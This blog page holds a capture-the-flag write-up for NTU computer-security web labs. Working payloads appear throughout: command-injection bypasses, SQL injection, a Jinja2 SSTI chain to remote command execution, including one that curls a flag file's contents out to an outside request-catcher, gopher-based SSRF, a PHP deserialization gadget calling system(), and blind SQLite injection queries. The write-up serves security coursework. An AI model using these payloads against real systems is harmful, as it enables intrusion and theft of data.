<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  NTU CS 2023 HW4 Write Up
  #


  Lab-Cat Shop
  #

Flag: FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}

  解題流程與思路
  #


這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選

但因為送出的item number可預期，所以還是能夠正常query

接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag




  Lab-DNS Lookuper
  #

Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}

  解題流程與思路
  #

Use $ or ` string to bypass blacklist
Payload:
'$(cat /fla*)'
'cat /fl*g*'

  Lab-Log me in
  #

Flag: FLAG{b4by_sql_inj3cti0n}

  解題流程與思路
  #


Payload → ') or ('1'='1') -- #
SELECT * FROM admin WHERE (username=&rsquo;&rsquo;) or (&lsquo;1&rsquo;=&lsquo;1&rsquo;) &ndash; #&rsquo;) AND (password=&lsquo;MTIz&rsquo;)


  Lab-Jinja2 SSTI
  #

Flag: FLAG{ssti.__class__.__pwn__}"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="NTU CS 2023 HW4 Write Up"><meta property="og:description" content="NTU CS 2023 HW4 Write Up # Lab-Cat Shop # Flag: FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}
解題流程與思路 # 這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選 但因為送出的item number可預期，所以還是能夠正常query 接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag Lab-DNS Lookuper # Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}
解題流程與思路 # Use $ or ` string to bypass blacklist Payload: '$(cat /fla*)' 'cat /fl*g*'
Lab-Log me in # Flag: FLAG{b4by_sql_inj3cti0n}
解題流程與思路 # Payload → ') or ('1'='1') -- # SELECT * FROM admin WHERE (username=’’) or (‘1’=‘1’) – #’) AND (password=‘MTIz’) Lab-Jinja2 SSTI # Flag: FLAG{ssti.__class__.__pwn__}"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="Web"><title>NTU CS 2023 HW4 Write Up | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>NTU CS 2023 HW4 Write Up</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#lab-cat-shop>Lab-Cat Shop</a><ul><li><a href=#解題流程與思路>解題流程與思路</a></li></ul></li><li><a href=#lab-dns-lookuper>Lab-DNS Lookuper</a><ul><li><a href=#解題流程與思路-1>解題流程與思路</a></li></ul></li><li><a href=#lab-log-me-in>Lab-Log me in</a><ul><li><a href=#解題流程與思路-2>解題流程與思路</a></li></ul></li><li><a href=#lab-jinja2-ssti>Lab-Jinja2 SSTI</a><ul><li><a href=#解題流程與思路-3>解題流程與思路</a></li></ul></li><li><a href=#lab-preview-card>Lab-Preview Card</a><ul><li><a href=#解題流程與思路-4>解題流程與思路</a></li></ul></li><li><a href=#lab-magic-cat>Lab-Magic Cat</a><ul><li><a href=#解題流程與思路-5>解題流程與思路</a></li></ul></li><li><a href=#hw-double-injection---flag1>HW-Double Injection - FLAG1</a><ul><li><a href=#解題流程與思路-6>解題流程與思路</a></li></ul></li><li><a href=#hw-double-injection---flag2>HW-Double Injection - FLAG2</a><ul><li><a href=#解題流程與思路-7>解題流程與思路</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=ntu-cs-2023-hw4-write-up>NTU CS 2023 HW4 Write Up
<a class=anchor href=#ntu-cs-2023-hw4-write-up>#</a></h1><h2 id=lab-cat-shop>Lab-Cat Shop
<a class=anchor href=#lab-cat-shop>#</a></h2><p>Flag: <code>FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}</code></p><h3 id=解題流程與思路>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af>#</a></h3><ol><li>這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選
<img src=https://hackmd.io/_uploads/SJ3bD8x_T.png alt=圖片>
但因為送出的item number可預期，所以還是能夠正常query
<img src=https://hackmd.io/_uploads/HJ6yDUe_a.png alt=圖片></li><li>接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag
<img src=https://hackmd.io/_uploads/Sko9wLldp.png alt=圖片>
<img src=https://hackmd.io/_uploads/S1CovLldp.png alt=圖片></li></ol><h2 id=lab-dns-lookuper>Lab-DNS Lookuper
<a class=anchor href=#lab-dns-lookuper>#</a></h2><p>Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}</p><h3 id=解題流程與思路-1>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1>#</a></h3><p>Use <font color=FF0000><strong><code>$</code></strong> or <strong>`</strong></font> string to bypass blacklist
Payload:
<code>'$(cat /fla*)'</code>
<code>'</code>cat /fl*g*<code>'</code></p><h2 id=lab-log-me-in>Lab-Log me in
<a class=anchor href=#lab-log-me-in>#</a></h2><p>Flag: <code>FLAG{b4by_sql_inj3cti0n}</code></p><h3 id=解題流程與思路-2>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-2>#</a></h3><ul><li>Payload → <code>') or ('1'='1') -- #</code>
SELECT * FROM admin WHERE (username=&rsquo;&rsquo;) or (&lsquo;1&rsquo;=&lsquo;1&rsquo;) &ndash; #&rsquo;) AND (password=&lsquo;MTIz&rsquo;)</li></ul><h2 id=lab-jinja2-ssti>Lab-Jinja2 SSTI
<a class=anchor href=#lab-jinja2-ssti>#</a></h2><p>Flag: <code>FLAG{ssti.__class__.__pwn__}</code></p><h3 id=解題流程與思路-3>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-3>#</a></h3><h4 id=easy-way>Easy way
<a class=anchor href=#easy-way>#</a></h4><p>payload: <code>{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /th1s_15_fl4ggggggg").read()}}</code>
<img src=https://i.imgur.com/dRLbk0J.png alt></p><h4 id=need-tool-way---beeceptor>Need Tool way - <a href=https://beeceptor.com/>Beeceptor</a>
<a class=anchor href=#need-tool-way---beeceptor>#</a></h4><p><code>Beeceptor</code> will catch our result from <code>curl</code>.
<font color=FF0000>It&rsquo;ll execute <code>cat /th1s_15_fl4ggggggg</code> first and the result will be sent to <code>Beeceptor</code> as attached data by <code>curl</code>.</font>
Payload:</p><pre tabindex=0><code class=language-! data-lang=!>{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;system&#39;](&#39;curl {Beeceptor URL} -d &#34;`cat /th1s_15_fl4ggggggg`&#34;&#39;)}}
</code></pre><p><img src=https://i.imgur.com/PQ39MMI.png alt></p><h2 id=lab-preview-card>Lab-Preview Card
<a class=anchor href=#lab-preview-card>#</a></h2><p>Flag: <code>FLAG{gopher://http_post}</code></p><h3 id=解題流程與思路-4>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-4>#</a></h3><p>When you see a preview function, then it may have SSRF problem.</p><ol><li><p>Test it
<code>file:///etc/passwd</code> or <code>http://127.0.0.1</code>
<img src=https://i.imgur.com/NKbIlDT.png alt></p></li><li><p>Analyze <code>flag.php</code>
<img src=https://i.imgur.com/OGo7biu.png alt>
:::spoiler source code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php
if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;) die(&#34;Only for localhost user.&#34;);
?&gt;
&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34;&gt;
    Do you want the FLAG? &lt;input type=&#34;text&#34; name=&#34;givemeflag&#34; value=&#34;no&#34;&gt;
    &lt;input type=&#34;submit&#34;&gt;
&lt;/form&gt;
&lt;?php
if (isset($_POST[&#39;givemeflag&#39;]) &amp;&amp; $_POST[&#39;givemeflag&#39;] === &#39;yes&#39;)
    echo &#34;FLAG:&#34;, getenv(&#39;FLAG&#39;);
</code></pre><p>:::
If you want flag, you need visit <code>/flag.php</code> as localhost and send a form data with parameter <code>givemeflag</code>.</p></li><li><p>Construct package - <font color=FF0000><strong>gopher</strong></font></p><pre tabindex=0><code class=language-! data-lang=!>POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

givemeflag=yes
</code></pre><p>Transferred by <a href=https://www.urlencoder.org/>urlencode</a> with <code>CRLF</code> type.
Payload: <code>gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Length%3A%2014%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0agivemeflag%3Dyes%0d%0a</code></p></li><li><p>Then we got flag&mldr;</p></li></ol><h2 id=lab-magic-cat>Lab-Magic Cat
<a class=anchor href=#lab-magic-cat>#</a></h2><p>Flag: <code>FLAG{magic_cat_pwnpwn}</code></p><h3 id=解題流程與思路-5>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-5>#</a></h3><ol><li><p>Test payload in local side</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ ./psysh
&gt; class Caster
. {
.     public $cast_func = &#39;intval&#39;;
.     function cast($val)
.     {
.         return ($this-&gt;cast_func)($val);
.     }
. }
&gt; $test = new Caster
= Caster {#2772
    +cast_func: &#34;intval&#34;,
  }

&gt; $test-&gt;cast_func = &#39;system&#39;
= &#34;system&#34;
&gt; $test-&gt;cast(&#39;pwd&#39;)
= &#34;/home/sbk6401&#34;
</code></pre></li><li><p>Construct serialized session</p><pre tabindex=0><code class=language-bash! data-lang=bash!>&gt; class Cat
. {
.     public $magic;
.     public $spell;
.     function __construct($spell)
.     {
.         $this-&gt;spell = $spell;
.         $this-&gt;magic = new Caster();
.     }
.     function __wakeup()
.     {
.         echo &#34;Cat Wakeup!\n&#34;;
.         $this-&gt;magic-&gt;cast($this-&gt;spell);
.     }
. }
&gt; $cat = new Cat(&#34;ls -al /&#34;)
= Cat {#2771
    +magic: Caster {#2763
      +cast_func: &#34;intval&#34;,
    },
    +spell: &#34;ls -al /&#34;,
  }
&gt; $cat-&gt;magic-&gt;cast_func = &#34;system&#34;
= &#34;system&#34;
&gt; base64_encode(serialize($cat))
= &#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjg6ImxzIC1hbCAvIjt9&#34;
</code></pre><p><img src=https://i.imgur.com/x5tCrhb.png alt></p></li><li><p>Get flag</p><pre tabindex=0><code class=language-bash! data-lang=bash!>&gt; $cat-&gt;spell = &#34;cat /flag*&#34;
= &#34;cat /flag*&#34;

&gt; base64_encode(serialize($cat))
= &#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9&#34;
</code></pre><p><img src=https://i.imgur.com/c5Kq7c4.png alt></p></li></ol><h2 id=hw-double-injection---flag1>HW-Double Injection - FLAG1
<a class=anchor href=#hw-double-injection---flag1>#</a></h2><p>Flag: <code>FLAG{sqlite_js0n_inject!on}</code></p><h3 id=解題流程與思路-6>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-6>#</a></h3><p>這一題超爆難，應該可以預見被splitline凌虐，先看Dockerfile寫了甚麼，安裝的前置作業結束以後，分別把FLAG1和FLAG2的內容丟到<code>/flag1.txt</code>,<code>/flag2-{random string}.txt</code>中，並且執行db的初始化，也就是把FLAG1當成admin的密碼，接著比較重要的一步是把存取db內容的file(<code>/etc/db.sqlite3</code>)的權限設定read-only，這個操作後續會說明重要的地方，最後就是執行app.js</p><ul><li>目標:
我們的目標是想辦法把FLAG1拿到手，但看了一圈app.js也沒有任何想法，雖然我知道username的地方有SQLinjection的洞，但重要的是如何把密碼送到前端給我們</li><li>一開始的想法:
送出post request後，會進到login route，並且db會對送來的username / password進行query，此時會發現有兩個if statement，當時我在想，只要滿足第一個if statement，他就會return並且render出原本的username，所以如果我可以創一個新的table或是insert原本的users table，並且把username設定成FLAG1，然後password設定已知，這樣的話就一定會進到第二個if statement，如此就算我不知道FLAG1是多少，他也會把username吐回來到前端<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>row</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>password</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>password</span> <span style=color:#f92672>!==</span> <span style=color:#a6e22e>FLAG1</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ejs</span>.<span style=color:#a6e22e>render</span>(<span style=color:#e6db74>`&lt;h1&gt;Success!&lt;/h1&gt;`</span>, { <span style=color:#a6e22e>username</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ejs</span>.<span style=color:#a6e22e>render</span>(<span style=color:#a6e22e>template</span>, { <span style=color:#a6e22e>username</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>html</span>);
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Unauthorized&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>但這個做法有兩個原因導致無法實踐<ol><li>前面講過，splitline把<code>/etc/db.sqlite3</code>設定成read-only，所以我們無法對他做任何修改</li><li>就算這個file可以修改，因為ejs.render的關係，如果給定的1st參數沒有format可以填入(就像第二個if出現的template)，他並不會把username一起render進去，雖然我也不確定為甚麼要這樣寫</li></ol></li><li>比較可行的方式<ol><li>逛了好幾圈app.js都沒有任何可以把username吐回前端的地方，代表這個思路應該不是可行的方式，此時可以想想看time based或是boolean based 這種blind injection，可能是個不錯的方式，雖然我也有嘗試union based，不過效果不大</li><li>因為是完全沒有任何filter的sql injection，所以我就直接在local的sqlite db browser下語法順便debug，當payload如下時:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>admin</span>.username<span style=color:#e6db74>&#34;) as a,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  json_extract(users, &#39;$.admin.username&#39;) as b,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  json_extract(users, &#39;$.admin.password&#39;) as c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>FROM db -- #
</span></span></span></code></pre></div><ul><li>在server端會變成<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#e6db74>&#34;$.admin.username\&#34;</span>) <span style=color:#66d9ef>as</span> a,   json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> b,   json_extract(users, <span style=color:#e6db74>&#39;$.admin.password&#39;</span>) <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>c</span> <span style=color:#66d9ef>FROM</span> db <span style=color:#75715e>-- # .password&#34;
</span></span></span></code></pre></div></li><li>完整的query會變成<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> json_extract(users, <span style=color:#e6db74>&#34;$.admin.username\&#34;</span>) <span style=color:#66d9ef>as</span> a,   json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> b,   json_extract(users, <span style=color:#e6db74>&#39;$.admin.password&#39;</span>) <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>c</span> <span style=color:#66d9ef>FROM</span> db <span style=color:#75715e>-- # .password&#34;) AS password FROM db
</span></span></span></code></pre></div></li><li>則query到的data如下<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>{</span> a: <span style=color:#66d9ef>null</span>, b: <span style=color:#e6db74>&#39;admin&#39;</span>, <span style=color:#66d9ef>c</span>: <span style=color:#e6db74>&#39;FLAG{flag-1}&#39;</span> <span style=color:#960050;background-color:#1e0010>}</span>
</span></span></code></pre></div></li></ul>第一個參數a為null是因為app.js中，我們的payload經過==JSON.stringify==，會在雙引號前加一個反斜線，這會導致query時，db不知道==$.admin.username==是甚麼東西，只有單引號沒有這個問題，但如果第一個query data不加上雙引號就會導致閉合不全而導致結果異常(如下)
<img src=https://hackmd.io/_uploads/Hy29LmYvp.png alt=圖片>
所以我乾脆第一個參數就算了，重新利用後兩個參數要到username和password</li><li>有了這個可以幹嘛呢?我們可以下條件，當條件符合的時候做A，否則做B，而A和B是有一些差異，可能是時間長度或是網站是否crash為基準，這樣的話我們就可以知道下的條件是否正確，POC如下:<ul><li><p>看長度</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> 
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> a,
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> b,
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.password&#39;</span>) <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>c</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>FROM</span> db
</span></span><span style=display:flex><span><span style=color:#66d9ef>WHERE</span>
</span></span><span style=display:flex><span>    b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>AND</span> IIF(<span style=color:#66d9ef>length</span>(<span style=color:#66d9ef>c</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span>, (<span style=color:#66d9ef>SELECT</span> randomblob(<span style=color:#ae81ff>1000000000</span> <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>) <span style=color:#66d9ef>FROM</span> sqlite_master <span style=color:#66d9ef>WHERE</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>LIMIT</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>); <span style=color:#75715e>-- # 
</span></span></span></code></pre></div><p>在local測試時，FLAG1=<code>FLAG{test}</code>，也就是只有10個字，如果條件設定不符合時，就會query出東西，因為條件不符回傳1，如下圖
<img src=https://hackmd.io/_uploads/SJxwu7Fwa.png alt=圖片></p><hr><p>反之，就會query不出東西，也就是crash
<img src=https://hackmd.io/_uploads/Hywt_QYvp.png alt=圖片></p></li><li><p>如果想要知道某一個字元可以substr這個function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> 
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> a,
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.username&#39;</span>) <span style=color:#66d9ef>as</span> b,
</span></span><span style=display:flex><span>  json_extract(users, <span style=color:#e6db74>&#39;$.admin.password&#39;</span>) <span style=color:#66d9ef>as</span> <span style=color:#66d9ef>c</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>FROM</span> db
</span></span><span style=display:flex><span><span style=color:#66d9ef>WHERE</span>
</span></span><span style=display:flex><span>    b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>AND</span> IIF(substr(<span style=color:#66d9ef>c</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;FLAG{&#39;</span>, (<span style=color:#66d9ef>SELECT</span> randomblob(<span style=color:#ae81ff>1000000000</span> <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>) <span style=color:#66d9ef>FROM</span> sqlite_master <span style=color:#66d9ef>WHERE</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>LIMIT</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>); <span style=color:#75715e>-- # 
</span></span></span></code></pre></div></li></ul></li><li>此時就可以開寫script去server端爆破FLAG1</li></ol></li></ul><h2 id=hw-double-injection---flag2>HW-Double Injection - FLAG2
<a class=anchor href=#hw-double-injection---flag2>#</a></h2><p>Flag: <code>FLAG{ezzzzz_sqli2ssti}</code></p><h3 id=解題流程與思路-7>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-7>#</a></h3><p>這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
<img src=https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png alt>
基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:</p><pre tabindex=0><code class=language-! data-lang=!>admin.password&#34;) as password, json_extract(users, &#39;$.admin.password&#39;) as password from db; -- #
</code></pre><p>後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看<a href=https://hackmd.io/@SBK6401/HkgkDNsPp>之前寫的文章</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#lab-cat-shop>Lab-Cat Shop</a><ul><li><a href=#解題流程與思路>解題流程與思路</a></li></ul></li><li><a href=#lab-dns-lookuper>Lab-DNS Lookuper</a><ul><li><a href=#解題流程與思路-1>解題流程與思路</a></li></ul></li><li><a href=#lab-log-me-in>Lab-Log me in</a><ul><li><a href=#解題流程與思路-2>解題流程與思路</a></li></ul></li><li><a href=#lab-jinja2-ssti>Lab-Jinja2 SSTI</a><ul><li><a href=#解題流程與思路-3>解題流程與思路</a></li></ul></li><li><a href=#lab-preview-card>Lab-Preview Card</a><ul><li><a href=#解題流程與思路-4>解題流程與思路</a></li></ul></li><li><a href=#lab-magic-cat>Lab-Magic Cat</a><ul><li><a href=#解題流程與思路-5>解題流程與思路</a></li></ul></li><li><a href=#hw-double-injection---flag1>HW-Double Injection - FLAG1</a><ul><li><a href=#解題流程與思路-6>解題流程與思路</a></li></ul></li><li><a href=#hw-double-injection---flag2>HW-Double Injection - FLAG2</a><ul><li><a href=#解題流程與思路-7>解題流程與思路</a></li></ul></li></ul></nav></div></aside></main></body></html>